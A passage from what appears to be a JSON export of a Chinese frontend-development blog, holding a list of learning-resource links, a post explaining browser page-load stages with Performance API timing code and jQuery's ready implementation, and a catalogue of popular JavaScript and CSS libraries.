href=\"http://caibaojian.com/40-html5-interview.html\">http://caibaojian.com/40-html5-interview.html</a></li>\n</ul>\n<h2 id=\"css\">css</h2>\n<ul>\n<li>css3 grid layout <a href=\"https://css-tricks.com/snippets/css/complete-guide-grid/#prop-align-items\">https://css-tricks.com/snippets/css/complete-guide-grid/#prop-align-items</a></li>\n</ul>\n<h2 id=\"full-stack\">full stack</h2>\n<ul>\n<li>Growth Engineering: The Definitive Guide。全栈增长工程师指南 <a href=\"http://growth.phodal.com/\">http://growth.phodal.com/</a></li>\n<li>全栈增长工程师实战 <a href=\"http://growth-in-action.phodal.com/\">http://growth-in-action.phodal.com/</a></li>\n</ul>\n<h2 id=\"jekyll\">Jekyll</h2>\n<ul>\n<li><p>Ovilia&#39;s blog <a href=\"http://zhangwenli.com/blog\">http://zhangwenli.com/blog</a>\n源码：<a href=\"https://github.com/Ovilia/blog\">https://github.com/Ovilia/blog</a></p>\n</li>\n<li><p>axuebin\n<a href=\"https://github.com/axuebin/blog\">https://github.com/axuebin/blog</a></p>\n</li>\n<li><p><a href=\"https://github.com/simongfxu/simongfxu.github.com\">https://github.com/simongfxu/simongfxu.github.com</a></p>\n</li>\n</ul>\n<h2 id=\"reactreact-nativeredux\">react,react-native,redux</h2>\n<ul>\n<li><p>react小书里面的例子\n<a href=\"https://github.com/huzidaha/react-naive-book-examples\">https://github.com/huzidaha/react-naive-book-examples</a></p>\n</li>\n<li><p>一个 react + redux 的完整项目 和 个人总结\n<a href=\"https://github.com/bailicangdu/react-pxq\">https://github.com/bailicangdu/react-pxq</a></p>\n</li>\n<li><p>一个react+redux+webpack+ES6+antd的SPA的后台管理框架demo\n<a href=\"https://github.com/duxianwei520/react\">https://github.com/duxianwei520/react</a></p>\n</li>\n<li><p>基于webpack + react + react-router + redux + less + flex.css + ES6 的React版cnode社区\n<a href=\"https://github.com/lzxb/react-cnode\">https://github.com/lzxb/react-cnode</a></p>\n</li>\n<li><p>React Native指南汇集了各类react-native学习资源、开源App和组件\n<a href=\"https://github.com/reactnativecn/react-native-guide\">https://github.com/reactnativecn/react-native-guide</a></p>\n</li>\n<li><p>Source code of the official F8 app of 2016, powered by React Native and other Facebook open source projects.\n<a href=\"https://github.com/fbsamples/f8app\">https://github.com/fbsamples/f8app</a></p>\n</li>\n</ul>\n<ul>\n<li>Redux 莞式教程。本教程深入浅出，配套入门、进阶源码解读以及文档注释丰满的 Demo 等一条龙服务\n<a href=\"https://github.com/kenberkeley/redux-simple-tutorial\">https://github.com/kenberkeley/redux-simple-tutorial</a></li>\n</ul>\n<h2 id=\"nodejs\">nodejs</h2>\n<ul>\n<li><p>express框架应用\n<a href=\"https://github.com/nswbmw/N-blog\">https://github.com/nswbmw/N-blog</a></p>\n</li>\n<li><p>express+mongodb+bootstrap blog system\n<a href=\"https://github.com/mz121star/NJBlog\">https://github.com/mz121star/NJBlog</a></p>\n</li>\n<li><p>《Node.js 包教不包会》 by alsotang\n<a href=\"https://github.com/alsotang/node-lessons\">https://github.com/alsotang/node-lessons</a></p>\n</li>\n</ul>\n<h2 id=\"vue\">vue</h2>\n<ul>\n<li><p>A curated list of awesome things related to Vue.js\n<a href=\"https://github.com/vuejs/awesome-vue\">https://github.com/vuejs/awesome-vue</a></p>\n</li>\n<li><p>记录vue-webapck的学习基础\n<a href=\"https://github.com/guowenfh/vue-webpack\">https://github.com/guowenfh/vue-webpack</a></p>\n</li>\n<li><p>Learn Vuex by Building a Notes App\n<a href=\"https://github.com/coligo-io/notes-app-vuejs-vuex\">https://github.com/coligo-io/notes-app-vuejs-vuex</a></p>\n</li>\n</ul>\n<h2 id=\"工具\">工具</h2>\n<ul>\n<li><p>Packaged version of Ace code editor\n<a href=\"https://github.com/ajaxorg/ace-builds\">https://github.com/ajaxorg/ace-builds</a></p>\n</li>\n<li><p>PNotify is a JavaScript notification plugin, developed by SciActive. PNotify can also provide desktop notifications based on the Web Notifications spec. If desktop notifications are not available or not allowed, PNotify will fall back to displaying the notice as a regular, in-browser notice.\n<a href=\"https://github.com/sciactive/pnotify\">https://github.com/sciactive/pnotify</a></p>\n</li>\n<li><p>JsGen is a next generation，free, open source web software that you can generate a powerful website, such as blog, forum, etc. It is coded by pure JavaScript, based on Node.js, AngularJS, MongoDB.\n<a href=\"https://github.com/zensh/jsgen\">https://github.com/zensh/jsgen</a></p>\n</li>\n</ul>\n<h2 id=\"其他\">其他</h2>\n<ul>\n<li><p>Web Development With Node and Express, first edition.配套代码\n<a href=\"https://github.com/EthanRBrown/web-development-with-node-and-express\">https://github.com/EthanRBrown/web-development-with-node-and-express</a></p>\n</li>\n<li><p>《A Practitioner&#39;s Guide to Software Test Design》的中文翻译\n<a href=\"https://github.com/miaoyinniao/Software-Test-Design-Guide-Cn\">https://github.com/miaoyinniao/Software-Test-Design-Guide-Cn</a></p>\n</li>\n<li><p>全栈工程师培训材料---阮一峰\n<a href=\"https://github.com/ruanyf/jstraining\">https://github.com/ruanyf/jstraining</a></p>\n</li>\n<li><p>分享自己长期关注的前端开发相关的优秀网站、博客、以及活跃开发者\n<a href=\"https://github.com/LittlewhiteChen/Front-end-collect\">https://github.com/LittlewhiteChen/Front-end-collect</a></p>\n</li>\n<li><p>前端技能汇总 Frontend Knowledge Structure\n<a href=\"https://github.com/JacksonTian/fks\">https://github.com/JacksonTian/fks</a></p>\n</li>\n</ul>\n","index":33},{"filePath":"post\\Comprehensive\\load-process.md","htmlPath":"/post/Comprehensive/load-process.html","name":"load-process.md","type":"md","title":"页面加载过程解析","date":"2017/10/12","categories":"Collection","tags":"面经","html":"<h1 id=\"页面加载\">页面加载</h1>\n<p>页面加载就是从你输入网址+enter开始，发生的一些列过程，最终到页面显示。 从微观上分的话，页面加载有两部分</p>\n<p>一个是以<code>DOMContentLoaded</code>触发为标志的DOM树的渲染完成</p>\n<p>一个是以辅助资源img,font加载完成为触发标志的onload事件</p>\n<p>他们两个的具体区别就是<code>&quot;资源的加载&quot;</code>这个关键点.</p>\n<p>在获得数据响应后,页面开始解析,发生的过程为:</p>\n<ol>\n<li>解析HTML结构。 </li>\n<li>加载外部脚本和样式表文件。 </li>\n<li>解析并执行脚本代码。 </li>\n<li>构造HTML DOM模型。//ready执行 </li>\n<li>加载图片等外部文件。 </li>\n<li>页面加载完毕。//load执行</li>\n</ol>\n<p>上文的页面加载其实只算是 </p>\n<p><code>浏览器处理</code>=&gt; <code>最后onload</code>  这一过程</p>\n<p>从你输入网站 + enter键后，发生的过程为:</p>\n<p><code>重定向</code>=&gt;<code>检查DNS缓存</code>=&gt; <code>DNS解析</code> =&gt; <code>TCP连接</code> =&gt; <code>发请求</code>=&gt; <code>得到响应</code>=&gt; <code>浏览器处理</code> =&gt; <code>最后onload</code></p>\n<h2 id=\"宏观页面加载\">宏观页面加载</h2>\n<p>以前，我们来检查浏览器的时候，大部分情况下是使用</p>\n<pre><code class=\"language-javascript\">console.time(specialNum);\nconsole.timeEnd(specialNum);</code></pre>\n<p>或者</p>\n<pre><code class=\"language-javascript\">new Date().getTime();\n//或者\nDate.now();</code></pre>\n<p>上面说的两种方法， 获取的精度都是<code>毫秒级(10^-6)</code></p>\n<p>ES5提出的<code>performance</code>可以获取到，<code>微秒级别(10^-9)</code></p>\n<p><code>performance.timing</code>对象\n{% asset_img timing.png %}</p>\n<p> <a href=\"https://www.cnblogs.com/libin-1/p/6501951.html\">https://www.cnblogs.com/libin-1/p/6501951.html</a></p>\n<p>比如，我们获得重定向时间用:</p>\n<pre><code class=\"language-javascript\">var time = performance.timing;\nvar redirect = time.redirectEnd - time.redirectStart; //单位为微秒\nDOMContentLoaded事件 是在domContentLoaded那段触发的。图中所指的domContentLoaded其实分为两块, 一个是domContentLoadedEventStart和domContentLoadedEventEnd. 详见下述说明:\n// 获取 performance 数据\nvar performance = {\n    // memory 是非标准属性，只在 Chrome 有\n    // 财富问题：我有多少内存\n    memory: {\n        usedJSHeapSize:  16100000, // JS 对象（包括V8引擎内部对象）占用的内存，一定小于 totalJSHeapSize\n        totalJSHeapSize: 35100000, // 可使用的内存\n        jsHeapSizeLimit: 793000000 // 内存大小限制\n    },\n\n    //  哲学问题：我从哪里来？\n    navigation: {\n        redirectCount: 0, // 如果有重定向的话，页面通过几次重定向跳转而来\n        type: 0           // 0   即 TYPE_NAVIGATENEXT 正常进入的页面（非刷新、非重定向等）\n                          // 1   即 TYPE_RELOAD       通过 window.location.reload() 刷新的页面\n                          // 2   即 TYPE_BACK_FORWARD 通过浏览器的前进后退按钮进入的页面（历史记录）\n                          // 255 即 TYPE_UNDEFINED    非以上方式进入的页面\n    },\n\n    timing: {\n        // 在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等\n        navigationStart: 1441112691935,\n\n        // 前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0\n        unloadEventStart: 0,\n\n        // 和 unloadEventStart 相对应，返回前一个网页 unload 事件绑定的回调函数执行完毕的时间戳\n        unloadEventEnd: 0,\n\n        // 第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0 \n        redirectStart: 0,\n\n        // 最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内部的重定向才算，否则值为 0 \n        redirectEnd: 0,\n\n        // 浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前\n        fetchStart: 1441112692155,\n\n        // DNS 域名查询开始的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等\n        domainLookupStart: 1441112692155,\n\n        // DNS 域名查询完成的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等\n        domainLookupEnd: 1441112692155,\n\n        // HTTP（TCP） 开始建立连接的时间，如果是持久连接，则与 fetchStart 值相等\n        // 注意如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接开始的时间\n        connectStart: 1441112692155,\n\n        // HTTP（TCP） 完成建立连接的时间（完成握手），如果是持久连接，则与 fetchStart 值相等\n        // 注意如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接完成的时间\n        // 注意这里握手结束，包括安全连接建立完成、SOCKS 授权通过\n        connectEnd: 1441112692155,\n\n        // HTTPS 连接开始的时间，如果不是安全连接，则值为 0\n        secureConnectionStart: 0,\n\n        // HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存\n        // 连接错误重连时，这里显示的也是新建立连接的时间\n        requestStart: 1441112692158,\n\n        // HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存\n        responseStart: 1441112692686,\n\n        // HTTP 响应全部接收完成的时间（获取到最后一个字节），包括从本地读取缓存\n        responseEnd: 1441112692687,\n\n        // 开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件\n        domLoading: 1441112692690,\n\n        // 完成解析 DOM 树的时间，Document.readyState 变为 interactive，并将抛出 readystatechange 相关事件\n        // 注意只是 DOM 树解析完成，这时候并没有开始加载网页内的资源\n        domInteractive: 1441112693093,\n\n        // DOM 解析完成后，网页内资源加载开始的时间\n        // 在 DOMContentLoaded 事件抛出前发生\n        domContentLoadedEventStart: 1441112693093,\n\n        // DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕）\n        domContentLoadedEventEnd: 1441112693101,\n\n        // DOM 树解析完成，且资源也准备就绪的时间，Document.readyState 变为 complete，并将抛出 readystatechange 相关事件\n        domComplete: 1441112693214,\n\n        // load 事件发送给文档，也即 load 回调函数开始执行的时间\n        // 注意如果没有绑定 load 事件，值为 0\n        loadEventStart: 1441112693214,\n\n        // load 事件的回调函数执行完毕的时间\n        loadEventEnd: 1441112693215\n    }\n};</code></pre>\n<p>不过<code>performance</code>还有另外一个方法 <code>now</code></p>\n<p><code>performance.now()</code></p>\n<p>通常，我们会将该方法和<code>Date.now()</code>进行一个对比。</p>\n<pre><code class=\"language-javascript\">performance.now();  //输出是微秒级别\nDate.now();  //输出是毫秒级别</code></pre>\n<p>其中<code>Date.now()</code>是输出 从<code>1970年</code>开始的毫秒数.</p>\n<p><code>performance.now()</code>参考的是从<code>performance.timing.navigationStart````(页面开始加载)</code>的时间, 到现在的微秒数.</p>\n<p>这里，我们可以使用<code>performance.now()</code>来模拟获取<code>DomContentLoaded</code>的时间。</p>\n<pre><code class=\"language-javascript\">var timesnipe = performance.now();\n        document.addEventListener(&#39;DOMContentLoaded&#39;, function() {\n            console.log(performance.now() - timesnipe);\n        }, false);\n\n        window.addEventListener(&#39;load&#39;, function() {\n           console.log(performance.now() - timesnipe);\n        }, false);\n//但是这样并不等同于,只能算作约等于\nperformance.timing.domContentLoadedEventStart - performance.timing.domLoading; //检测domLoadEvent触发时间\n</code></pre>\n<p>上面不相等的原因就在于，当执行script的时候，DOM其实已经开始解析DOM和页面内容， 所以会造成时间上比真实时间<code>略短</code>。</p>\n<h2 id=\"redirect\">redirect</h2>\n<p>这是页面加载的第一步(也有可能没有). 比如，当一个页面已经迁移，但是你输入原来的网站地址的时候就会发生。 </p>\n<p>或者， 比如<code>example.com</code> -&gt;<code>m.example.com/home</code>。</p>\n<p>这里就会经过两次DNS解析，TCP连接，以及请求的发送,耗费的时间成本是双倍的。所以，<code>在后台设置好正确的网址是很重要的。</code>\n {% asset_img 2.png %}</p>\n<p>这里，我们可以使用<code>performance</code>的属性,计算出<code>重定向时间</code></p>\n<pre><code class=\"language-javascript\">redirectTime = redirectEnd - redirectStart</code></pre>\n<h2 id=\"cachednstcprequestresponse\">cache,DNS,TCP,Request,Response</h2>\n<p>如果我们的域名输入正确的话，接着，浏览器会查询本地是否有域名缓存(appCache)，如果有，则不需要进行DNS解析，否则需要对域名进行解析，找到真实的IP地址，然后建立3次握手连接， 发送请求， 最后接受数据。 通常，这一部分，可以做的优化有:</p>\n<p>发送请求的优化:加异地机房，加CDN.(加快解析request)</p>\n<p>请求加载数据的优化:页面内容经过 gzip 压缩，静态资源 css/js 等压缩(request到response的优化)</p>\n<p>ok~ 使用performance测试时间为:</p>\n<p>DNS查询耗时 = domainLookupEnd - domainLookupStart</p>\n<p>TCP链接耗时 = connectEnd - connectStart</p>\n<p>request请求耗时 = responseEnd - responseStart</p>\n<p>解析dom树耗时 = domComplete - domInteractive</p>\n<p>白屏时间 = domloadng - fetchStart</p>\n<p>domready时间 = domContentLoadedEventEnd - fetchStart</p>\n<p>onload时间 = loadEventEnd - fetchStart</p>\n<p>其实，只要对照第一个图查查就可以，不用太关注上面的式子。使用时需要注意，<code>performance的相关操作，最好放在onload的回调中执行，避免出现异常的bug.</code></p>\n<pre><code class=\"language-javascript\">;\n(function() {\n\n    handleAddListener(&#39;load&#39;, getTiming)\n\n    function handleAddListener(type, fn) {\n        if(window.addEventListener) {\n            window.addEventListener(type, fn)\n        } else {\n            window.attachEvent(&#39;on&#39; + type, fn)\n        }\n    }\n\n    function getTiming() {\n        try {\n            var time = performance.timing;\n            var timingObj = {};\n\n            var loadTime = (time.loadEventEnd - time.loadEventStart) / 1000;\n\n            if(loadTime &lt; 0) {\n                setTimeout(function() {\n                    getTiming();\n                }, 200);\n                return;\n            }\n\n            timingObj[&#39;重定向时间&#39;] = (time.redirectEnd - time.redirectStart) / 1000;\n            timingObj[&#39;DNS解析时间&#39;] = (time.domainLookupEnd - time.domainLookupStart) / 1000;\n            timingObj[&#39;TCP完成握手时间&#39;] = (time.connectEnd - time.connectStart) / 1000;\n            timingObj[&#39;HTTP请求响应完成时间&#39;] = (time.responseEnd - time.requestStart) / 1000;\n            timingObj[&#39;DOM开始加载前所花费时间&#39;] = (time.responseEnd - time.navigationStart) / 1000;\n            timingObj[&#39;DOM加载完成时间&#39;] = (time.domComplete - time.domLoading) / 1000;\n            timingObj[&#39;DOM结构解析完成时间&#39;] = (time.domInteractive - time.domLoading) / 1000;\n            timingObj[&#39;脚本加载时间&#39;] = (time.domContentLoadedEventEnd - time.domContentLoadedEventStart) / 1000;\n            timingObj[&#39;onload事件时间&#39;] = (time.loadEventEnd - time.loadEventStart) / 1000;\n            timingObj[&#39;页面完全加载时间&#39;] = (timingObj[&#39;重定向时间&#39;] + timingObj[&#39;DNS解析时间&#39;] + timingObj[&#39;TCP完成握手时间&#39;] + timingObj[&#39;HTTP请求响应完成时间&#39;] + timingObj[&#39;DOM结构解析完成时间&#39;] + timingObj[&#39;DOM加载完成时间&#39;]);\n\n            for(item in timingObj) {\n                console.log(item + &quot;:&quot; + timingObj[item] + &#39;毫秒(ms)&#39;);\n            }\n\n            console.log(performance.timing);\n\n        } catch(e) {\n            console.log(timingObj)\n            console.log(performance.timing);\n        }\n    }\n})();</code></pre>\n<h2 id=\"processonload\">process,onload</h2>\n<p>这里的过程其实就和开头的时候说的一样</p>\n<ol>\n<li>解析HTML结构。 </li>\n<li>加载外部脚本和样式表文件。 </li>\n<li>解析并执行脚本代码。 </li>\n<li>构造HTML DOM模型。//ready执行 </li>\n<li>加载图片等外部文件。 </li>\n<li>页面加载完毕。//load执行</li>\n</ol>\n<p>ok~ 这里，我们来计算一下时间:\n上performance</p>\n<pre><code class=\"language-javascript\">//计算DOMContentLoaded触发时间\nvar contentLoadedTime = t.domContentLoadedEventStart-t.domLoading\n//计算load触发时间\nvar loadTime = t.domComplete - t.domLoading;</code></pre>\n<p>DOMContentLoaded事件比onload事件先触发</p>\n<p>如果你的js文件涉及DOM操作，可以直接在<code>DOMContentLoaded</code>里面添加回调函数，或者说基本上我们的js文件都可以写在里面进行调用. </p>\n<p>其实，这和我们将js文件放在body底部，在js上面加async,defer,以及hard Callback异步加载js文件的效果是一样的。</p>\n<h1 id=\"jquery-ready事件浅析\">jquery ready事件浅析</h1>\n<p>jquery主要做的工作就是兼容IE6,7,8实现<code>DOMContentLoaded</code>的效果\n目前流行的做法有两种， 一种是使用<code>readystatechange</code>实现，另外一种使用IE自带的<code>doScroll</code>方法实现.</p>\n<h2 id=\"readystatechange\">readyStateChange</h2>\n<p>这其实是IE6，7，8的特有属性，用它来标识某个元素的加载状态。 但是现在w3c规定，只有xhr才有这个事件。 所以，这里，我们一般只能在IE中使用readyStateChange否则，其他浏览器是没有效果的。</p>\n<p>这样，我们模拟jquery的ready事件时就可以使用:</p>\n<pre><code class=\"language-javascript\">document.onreadystatechange = function () {\n  if (document.readyState == &quot;interactive&quot; || document.readyState == &quot;complete&quot;) {\n        //添加回调...\n  }\n}</code></pre>\n<p>理想很丰满，现实很骨感。 事实上, 当<code>readyState</code>为<code>interactive</code>时， Dom的结构并未完全稳定，如果还有其他脚本影响DOM时, 这时候可能会造成bug。</p>\n<p> 另外为<code>complete</code>时， 这时候图片等相关资源已经加载完成。 这个时候模拟触发<code>DOMContentLoaded</code>事件，其实和<code>onload</code>事件触发时间并没有太久的时间距离。 </p>\n<p> 这种方式兼容低版本IE还是不太可靠的。</p>\n<h2 id=\"doscroll\">doScroll</h2>\n<p>这是IE低版本特有的，不过IE11已经弃用了。 使用<code>scrollLeft</code>和<code>scrollTop</code>代替.<code>doScroll</code>的主要作用是检测DOM结构是否稳定， </p>\n<p>通常我们会使用<code>轮询</code>来检测<code>doScroll</code>是否可用，当可用的时候一定是DOM结构稳定，图片资源还未加载的时候。</p>\n<p>我们来看一下jquery中实现doScroll的兼容:</p>\n<pre><code class=\"language-javascript\">//低版本的IE浏览器，这里添加监听作为向下兼容，如果doScroll执行出现bug，也能保证ready函数的执行\n    document.attachEvent( &quot;onreadystatechange&quot;, DOMContentLoaded );\n     window.attachEvent( &quot;onload&quot;, jQuery.ready );\n//在ready里面会对执行做判断，确保只执行一次\n     var top = false;\n// 如果是IE且不是iframe就通过不停的检查doScroll来判断dom结构是否ready\ntry {\n    top = window.frameElement == null &amp;&amp; document.documentElement;\n} catch(e) {}\nif ( top &amp;&amp; top.doScroll ) {\n    (function doScrollCheck() {\n        if ( !jQuery.isReady ) {//ready方法没有执行过\n            try {\n                // 检查是否可以向左scroll滑动,当dom结构还没有解析完成时会抛出异常\n                top.doScroll(&quot;left&quot;);\n            } catch(e) {\n                //递归调用,直到当dom结构解析完成\n                return setTimeout( doScrollCheck, 50 );\n            }\n            //没有发现异常,表示dom结构解析完成,删除之前绑定的onreadystatechange事件\n\n            //执行jQuery的ready方法\n            jQuery.ready();\n        }\n    })();\n}</code></pre>\n<pre><code class=\"language-javascript\">//看看jQuery.ready()方法:\nready:function(wait) {\n    if (wait === true ? --jQuery.readyWait : jQuery.isReady) {\n        //判断页面是否已完成加载并且是否已经执行ready方法\n        //通过isReady状态进行判断, 保证只执行一次\n        return;\n    }\n    if (!document.body) {\n        return setTimeout(jQuery.ready);\n    }\n    jQuery.isReady = true; //指示ready方法已被执行\n      //这也是上面两次绑定事件的原因,会保证只执行一次\n    if (wait !== true &amp;&amp; --jQuery.readyWait &gt; 0) {\n        return;\n    }\n    //以下是处理ready的状态\n    readyList.resolveWith(document, [jQuery]);\n    if (jQuery.fn.trigger) {\n    //解除引用\n        jQuery(document).trigger(&quot;ready&quot;).off(&quot;ready&quot;);\n    }\n}\n</code></pre>\n","index":34},{"filePath":"post\\Comprehensive\\popular-resource.md","htmlPath":"/post/Comprehensive/popular-resource.html","name":"popular-resource.md","type":"md","title":"前端库收集","date":"2018-1-1","categories":"Collection","tags":"日常记录","html":"<h2 id=\"动画\">动画</h2>\n<h3 id=\"greensock\">GreenSock</h3>\n<pre><code>了解资料\n\n[greensock get-started-js](https://greensock.com/get-started-js#intro)\n\n[3D Transforms &amp; More CSS3 Goodies Arrive in GSAP JS](https://greensock.com/css3)\n\n基础实例\n\n[Jump Start: GSAP JS](https://greensock.com/jump-start-js#welcome)\n\n[Timeline Tip: Understanding the Position Parameter](https://greensock.com/position-parameter)\n\n[Basic play / pause toggle button](https://codepen.io/GreenSock/pen/qeHac)\n\n[create a playful Jump Loader animation](https://tympanus.net/codrops/2015/03/25/jump-loader-animation-svg-gsap/)\n\n进阶\n[Writing Smarter Animation Code](https://css-tricks.com/writing-smarter-animation-code/)\n\n[https://greensock.com/examples-showcases](https://greensock.com/examples-showcases)\n\n[https://tympanus.net/codrops/](https://tympanus.net/codrops/)\n隆重介绍这个网站，上面有好多好多好看的动画</code></pre><h3 id=\"draggable\">Draggable</h3>\n<pre><code>Draggable是一个简单易用的模块化拖放库。它通过快速DOM重新排序，干净的API和可访问的标记提供了出色的拖放功能。Draggable附带额外的模块，可以添加更多的功能，如排序，交换和其他实用程序。</code></pre><h3 id=\"animatecss\">Animate.css</h3>\n<pre><code>Animate.css是一个跨浏览器的CSS动画库。它非常易于使用，并提供大量不同的动画效果，如反弹，脉冲，摆动，淡入淡出，翻转等等。它可以用于在任何你喜欢的地方添加一些很酷和有趣的动画效果。</code></pre><h3 id=\"micron\">Micron</h3>\n<pre><code>是一个允许你为DOM元素添加不同的CSS增强动画的库。其中交互可以通过HTML数据属性或通过链接JavaScript方法来设置速度、消除和其他选项来控制。它支持不同的交互，如摇晃、褪色、反弹、摇摆（shake, fade, bounce, swing）等等。</code></pre><h2 id=\"animate-elements-on-scroll\">animate elements on scroll</h2>\n<h3 id=\"wow\">WOW</h3>\n<pre><code> http://mynameismatthieu.com/WOW/docs.html </code></pre><h3 id=\"aos\">AOS</h3>\n<pre><code>http://michalsnik.github.io/aos/\nAOS 是一个用于在页面滚动的时候呈现元素动画的工具库，和 WOWJS 类似。但是AOS是 CSS3 动画驱动的库，该库是高度可定制的，非常小，易于使用（通过CDN安装）。在页面往回滚动时，元素会恢复到原来的状态，如此达到循环动画的效果。</code></pre><h2 id=\"存储\">存储</h2>\n<h3 id=\"localforage\">localForage</h3>\n<pre><code>用于indexedDB和WebSQL的封装程序，能够让你的Web应用程序存储更多数据，并提升应用程序的离线体验。写入和读取操作与                localStorage类似，支持 BLOB 和任意类型的数据，可以存储图片，文件等等，而不仅仅是字符串。它还提供多种API，使开发               人员可以选择回调的异步API。</code></pre><h2 id=\"邮件\">邮件</h2>\n<h3 id=\"mjml\">MJML</h3>\n<pre><code>The only framwork that makes responsive email easy</code></pre><h2 id=\"vr\">VR</h2>\n<h3 id=\"a-frame\">A-Frame</h3>\n<pre><code>是 Mozilla 开源的网页虚拟现实体验（ WebVR ）框架。能够在HTML中创建3D场景的框架，使用Three.js和WebGL来创建VR场景。可用于桌面、iPhone（即将支持安卓）以及 Oculus Rift。</code></pre><h3 id=\"gpujs\">GPU.js</h3>\n<pre><code>用于在GPU中运行浏览器JavaScript代码的库。使用GPU.js，您可以通过将专门编写的JS编译成可通过WebGL在GPU上运行的着色器语言来更快速地执行复杂的计算。如果WebGL不可用，则函数将回退到常规JavaScript。</code></pre><h2 id=\"http\">HTTP</h2>\n<h3 id=\"r2\">R2</h3>\n<pre><code>这是一个更轻量级的 HTTP 客户端解决方案，它建立在浏览器原生的 Fetch API 的基础之上，并为 Node.js 提供优化。压缩后的R2大小只有16K。</code></pre><h3 id=\"axios\">Axios</h3>\n<pre><code>为处理HTTP请求提供了一个现代化的JavaScript解决方案。它有一个基于Promise的API，在处理async调用时使你的代码更加结构化。该库可以在浏览器中工作，也可以在node.js环境中工作。</code></pre><h2 id=\"桌面通知\">桌面通知</h2>\n<h3 id=\"push\">Push</h3>\n<pre><code>Push是一款可靠的跨浏览器的JavaScript桌面通知库。它基于强大的Notification API，如果用户的浏览器不支持新API，则会回退到较早的实现。</code></pre><h2 id=\"自适应\">自适应</h2>\n<h3 id=\"devicescss\">Devices.css</h3>\n<pre><code>Devices.css 是一个使用纯 CSS 实现移动设备的库。它包含了一些目前主流的移动设备，如 iPhone X，Google Pixel 2 XL 和三星Galaxy S8。由于其高品质的设计，可用于着陆页面或者网页快照。</code></pre><h3 id=\"lit\">Lit</h3>\n<pre><code>是一个非常小和响应式CSS框架。它包含12列响应式网格、不同的排印风格、自定义输入、三种按钮类型以及CSS框架应该提供的所有功能。Lit适用于所有现代浏览器，以及IE11等一些较旧的浏览器</code></pre><h3 id=\"tachyons\">Tachyons</h3>\n<pre><code>你可以制作漂亮且响应速度快的界面，并且几乎不需要CSS。它很容易使用和定制，移动优先，并能很好地与React、Ember、Angular和其他框架配合使用。更重要的是，它非常轻量级，并且具有非常详细的文档，你可以在其中找到所需的一切。</code></pre><h3 id=\"rekit\">Rekit</h3>\n<pre><code>是一款可帮助你使用React、Redux和React-router创建出色的响应式Web应用程序的工具包。该框架提供了两个用于处理框架的强大工具 — 一个名为Rekit Studio的全功能IDE，以及一个用于在终端上工作的扩展命令行界面。</code></pre><h2 id=\"字体\">字体</h2>\n<h3 id=\"nerd-font\">Nerd Font</h3>\n<pre><code>这是一个流行字体和图标的集合。它包含39个补充字体系列，以及来自诸如Font Awesome、Devicons、Octicons等流行图标集的1300多个图形和图标。所有字体在Linux、macOS和Windows上兼容。</code></pre><h2 id=\"链接\">链接</h2>\n<h3 id=\"kutt\">Kutt</h3>\n<pre><code>是一个免费的可以用来缩短你的URL、管理链接和设置自定义域的开源库。它有一个易于使用的API，并允许你创建和删除URL，以及使用详细统计信息跟踪它们。</code></pre><h2 id=\"卡片\">卡片</h2>\n<h3 id=\"card\">Card</h3>\n<pre><code>Card是一个小巧的vanilla JS项目（带有jQuery版本），可以让你的信用卡表格变得更加有趣生动。快速安装后，将采取您的表格，并将其转换为一张动画的信用卡。</code></pre><h2 id=\"图片\">图片</h2>\n<h3 id=\"direction-reveal\">Direction Reveal</h3>\n<pre><code>该插件检测光标进入或离开块时的方向，允许你使用各种酷炫特效和过渡。它提供了一些开箱即用的CSS动画，让你可以轻松创建自己的CSS动画。</code></pre><h3 id=\"carbon\">Carbon</h3>\n<pre><code>允许你创建并分享代码组成的美丽图像。你所需要做的就是将你的代码粘贴到编辑器中，或直接自己编写代码。你可以通过更改字体样式、编辑器主题、语法高亮和甚至窗口按钮来自定义图像的外观。</code></pre><h2 id=\"弹出框\">弹出框</h2>\n<h3 id=\"sweetalert2\">SweetAlert2</h3>\n<pre><code>是一个可以创建漂亮和可响应弹出框的库。SweetAlert2是高度可定制的，100%响应式并且在所有屏幕尺寸上都能有很好的显示效果。使用SweetAlert2 你可以创建各种不同的拥有惊艳的风格、显示效果和动画的弹出框。</code></pre><h2 id=\"h5\">H5</h2>\n<h3 id=\"phaser\">Phaser</h3>\n<pre><code>是一个快速的开源框架，可以开发为运行在桌面浏览器或手机浏览器的HTML5游戏。你也可以为iOS、Android和其他不同的本地应用程序创建游戏。Phaser有对开发人员非常友好的API，并且Phaser的团队也积极开发和维护。最近，在Phaser 3.0版本中发布了很多新的特性和功能。</code></pre><h2 id=\"cms\">CMS</h2>\n<h3 id=\"keystonejs\">KeystoneJS</h3>\n<pre><code>KeystoneJS是一个功能强大的CMS框架，基于Express和MongoDB构建，它提供了一个漂亮的管理用户界面，实用的API应用程序，会话管理，电子邮件发送，扩展等等。</code></pre><h2 id=\"其他\">其他</h2>\n<h3 id=\"puppeteer\">Puppeteer</h3>\n<pre><code>Puppeteer是一个Node.js API，用于控制 headless Chrome。由 Google官方的 Chrome DevTools 团队维护。在headless环境中，开发者可以生成网页截图或者 PDF ，通过Puppeteer的提供的api直接控制Chrome模拟大部分用户操作来进行UI Test或者作为爬虫访问页面来收集数据。</code></pre><h3 id=\"deeplearnjs\">Deeplearn.js</h3>\n<pre><code>Deeplearn.js是一个开放源代码库，可将高性能机器学习构建模块带入网络。它提供了两个API，即时执行模型和延期执行模型。它可以完全在浏览器中运行，不需要安装，不需要后端处理。</code></pre><h3 id=\"popperjs\">Popper.js</h3>\n<pre><code>Popper是一个JavaScript库，它提供了大量的定制选项，并且完全模块化，每个功能都有独立的插件。不需要依赖 jQuery 库，大小仅为 3.5KB 